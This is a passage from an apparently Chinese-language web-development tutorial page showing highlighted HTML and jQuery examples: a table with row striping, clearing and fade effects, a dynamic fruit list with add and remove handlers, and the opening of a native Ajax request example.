class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item4<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item5<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item1<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item2<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item3<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item4<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item5<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item1<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item2<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item3<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item4<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item5<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item1<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item2<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item3<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item4<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item5<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item1<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item2<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item3<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item4<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item5<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">tbody</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;buttons&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;pretty&quot;</span>&gt;</span>隔行换色<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;clear&quot;</span>&gt;</span>清除数据<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;remove&quot;</span>&gt;</span>删除一行<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;hide&quot;</span>&gt;</span>表格淡出<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!-- 引入jQuery --&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;../js/jquery-3.6.0.min.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!-- 在网站点击复制标签，然后复制到本页，使用在线js --&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!-- &lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js&quot;&gt;&lt;/script&gt; --&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// alert($) 检查jQuery是否导入成功 $ == jQuery</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// $(&#x27;选择器&#x27;) --&gt; jQuery对象 --&gt; 封装了很多方法</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// one点击一次就失效，on绑定事件，off移除事件</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t$(<span class=\"string\">&#x27;#pretty&#x27;</span>).<span class=\"title function_\">one</span>(<span class=\"string\">&#x27;click&#x27;</span>, <span class=\"function\">() =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t$(<span class=\"string\">&#x27;#data&gt;tbody&gt;tr:odd&#x27;</span>).<span class=\"title function_\">css</span>(<span class=\"string\">&#x27;background-color&#x27;</span>, <span class=\"string\">&#x27;lightgrey&#x27;</span>) <span class=\"comment\">// 获取奇数行（.css传一个参数表示读取当前样式，传第二个表示修改样式）</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t$(<span class=\"string\">&#x27;#data&gt;tbody&gt;tr:even&#x27;</span>).<span class=\"title function_\">css</span>(<span class=\"string\">&#x27;background-color&#x27;</span>, <span class=\"string\">&#x27;lightseagreen&#x27;</span>) <span class=\"comment\">// 获取偶数行</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t$(<span class=\"string\">&#x27;#clear&#x27;</span>).<span class=\"title function_\">on</span>(<span class=\"string\">&#x27;click&#x27;</span>, <span class=\"function\">() =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t$(<span class=\"string\">&#x27;#data&gt;tbody&gt;tr&gt;td&#x27;</span>).<span class=\"title function_\">empty</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t$(<span class=\"string\">&#x27;#remove&#x27;</span>).<span class=\"title function_\">on</span>(<span class=\"string\">&#x27;click&#x27;</span>, <span class=\"function\">() =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t$(<span class=\"string\">&#x27;#data&gt;tbody&gt;tr:last-child&#x27;</span>).<span class=\"title function_\">remove</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t$(<span class=\"string\">&#x27;#hide&#x27;</span>).<span class=\"title function_\">on</span>(<span class=\"string\">&#x27;click&#x27;</span>, <span class=\"function\">() =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">let</span> title = $(<span class=\"string\">&#x27;#hide&#x27;</span>).<span class=\"title function_\">text</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">if</span> (title == <span class=\"string\">&#x27;表格淡出&#x27;</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t$(<span class=\"string\">&#x27;#data&#x27;</span>).<span class=\"title function_\">fadeOut</span>(<span class=\"number\">1000</span>, <span class=\"function\">() =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t$(<span class=\"string\">&#x27;#hide&#x27;</span>).<span class=\"title function_\">text</span>(<span class=\"string\">&#x27;表格淡入&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t$(<span class=\"string\">&#x27;#data&#x27;</span>).<span class=\"title function_\">fadeIn</span>(<span class=\"number\">2000</span>, <span class=\"function\">() =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t$(<span class=\"string\">&#x27;#hide&#x27;</span>).<span class=\"title function_\">text</span>(<span class=\"string\">&#x27;表格淡出&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"动态列表效果jQuery-html\"><a href=\"#动态列表效果jQuery-html\" class=\"headerlink\" title=\"动态列表效果jQuery.html\"></a>动态列表效果jQuery.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t* &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#container</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">20px</span> <span class=\"number\">50px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#fruits</span>&gt;<span class=\"selector-tag\">li</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">list-style</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">50px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-size</span>: <span class=\"number\">20px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">line-height</span>: <span class=\"number\">50px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-color</span>: cadetblue;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: white;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-align</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">2px</span> <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#fruits</span>&gt;<span class=\"selector-tag\">li</span>&gt;<span class=\"selector-tag\">a</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">float</span>: right;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-decoration</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: white;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">position</span>: relative;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">right</span>: <span class=\"number\">5px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#fruits</span>~<span class=\"selector-tag\">input</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">outline</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-size</span>: <span class=\"number\">18px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#fruits</span>~<span class=\"selector-tag\">input</span><span class=\"selector-attr\">[type=text]</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border-bottom</span>: <span class=\"number\">1px</span> solid darkgray;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">50px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-align</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#fruits</span>~<span class=\"selector-tag\">input</span><span class=\"selector-attr\">[type=button]</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">80px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">30px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-color</span>: coral;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: white;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">vertical-align</span>: bottom;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">cursor</span>: pointer;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;container&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;fruits&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">&lt;!-- 将a标签的href属性修改为javascript:void(0)可以阻止a标签默认的行为 --&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>苹果<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span>×<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>香蕉<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span>×<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>火龙果<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span>×<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>西瓜<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span>×<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;fruit&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;ok&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;button&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;确定&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!-- &lt;script src=&quot;../js/动态列表效果.js&quot;&gt;&lt;/script&gt; --&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;../js/jquery-3.6.0.min.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">function</span> <span class=\"title function_\">removeListItem</span>(<span class=\"params\">evt</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"comment\">// 阻止事件的默认行为</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\tevt.<span class=\"title function_\">preventDefault</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"comment\">// 阻止事件的传播行为</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"comment\">// evt.stopPropagation()</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"comment\">// (4)$函数的参数是一个原生的JS对象，返回与原生JS对象对应的jQuery对象</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t$(evt.<span class=\"property\">target</span>).<span class=\"title function_\">parent</span>().<span class=\"title function_\">remove</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// +function() &#123; alert(&#x27;hello&#x27;) &#125;() or (function() &#123; alert(&#x27;hello&#x27;) &#125;)() - 即时调用函数</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// $(document).ready(function() &#123; &#125;) / $(function() &#123;&#125;) / $(() =&gt; &#123;&#125;) - 即时调用函数jQuery写法</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// $函数的四种用法：</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// (1)$函数的参数是一个匿名函数或箭头函数，传入的函数是页面加载完成之后要执行的回调函数</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t$(() =&gt; &#123; </span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"comment\">// (2)$函数的参数是一个样式表选择器，获取页面元素得到一个jQuery对象(伪数组 - 数组中装的是原生JS对象)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t$(<span class=\"string\">&#x27;#fruits&gt;li&gt;a&#x27;</span>).<span class=\"title function_\">on</span>(<span class=\"string\">&#x27;click&#x27;</span>, removeListItem)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t$(<span class=\"string\">&#x27;#ok&#x27;</span>).<span class=\"title function_\">on</span>(<span class=\"string\">&#x27;click&#x27;</span>, <span class=\"function\">(<span class=\"params\">evt</span>) =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"keyword\">let</span> input = $(<span class=\"string\">&#x27;#ok&#x27;</span>).<span class=\"title function_\">prev</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"keyword\">let</span> name = input.<span class=\"title function_\">val</span>().<span class=\"title function_\">trim</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"keyword\">if</span> (name) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t$(<span class=\"string\">&#x27;#fruits&#x27;</span>).<span class=\"title function_\">append</span>(</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"comment\">// (3)$函数的参数是一个标签字符串，创建一个新的元素并获得对应的jQuery对象</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t$(<span class=\"string\">&#x27;&lt;li&gt;&#x27;</span>).<span class=\"title function_\">text</span>(name).<span class=\"title function_\">append</span>(</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t$(<span class=\"string\">&#x27;&lt;a href=&quot;&quot;&gt;&#x27;</span>).<span class=\"title function_\">html</span>(<span class=\"string\">&#x27;&amp;times;&#x27;</span>).<span class=\"title function_\">on</span>(<span class=\"string\">&#x27;click&#x27;</span>, removeListItem)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\tinput.<span class=\"title function_\">val</span>(<span class=\"string\">&#x27;&#x27;</span>).<span class=\"title function_\">get</span>(<span class=\"number\">0</span>).<span class=\"title function_\">focus</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"原生Ajax请求-html\"><a href=\"#原生Ajax请求-html\" class=\"headerlink\" title=\"原生Ajax请求.html\"></a>原生Ajax请求.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--  </span></span><br><span class=\"line\"><span class=\"comment\">Ajax = Asynchronous JavaScript and XML</span></span><br><span class=\"line\"><span class=\"comment\">- 异步加载 - 在后台向服务器发起获取数据的请求(非阻塞，不等待，非同时)</span></span><br><span class=\"line\"><span class=\"comment\">- 局部刷新 - dom操作对页面元素进行改变</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">--&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Ajax请求<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">p</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: lightseagreen;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-family</span>: <span class=\"string\">&quot;arial rounded mt bold&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-size</span>: <span class=\"number\">30px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span 